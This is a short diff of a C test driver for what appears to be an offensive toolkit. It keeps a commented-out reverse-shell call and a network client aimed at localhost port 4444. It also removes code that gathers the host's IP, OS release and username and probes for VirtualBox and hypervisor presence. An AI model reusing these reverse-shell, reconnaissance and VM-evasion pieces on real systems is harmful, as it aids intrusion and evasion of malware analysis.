@@ -18,7 +18,6 @@
 #include <stdio.h>
 #include <string.h>
 #include "include/stub/shell.h"
-#include "include/stub/sys.h"
 #include "include/stub/re.h"
 #include "include/stub/net.h"
 void help_menu(){
@@ -28,13 +27,6 @@ void help_menu(){
 int main(){
   help_menu();
   //shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_FALSE);
-  sys_info_t *p_sys_info = sys_info();
-  printf("%s\n", p_sys_info->ip);
-  printf("%s\n", p_sys_info->release);
-  printf("%s\n", p_sys_info->username);
-  free(p_sys_info);
-  printf("module: %d\n", re_kernel_module("vboxguest"));
-  printf("hypervisor: %d\n", re_hypervisor());
   net_client("127.0.0.1", 4444);
   return 0;
 }
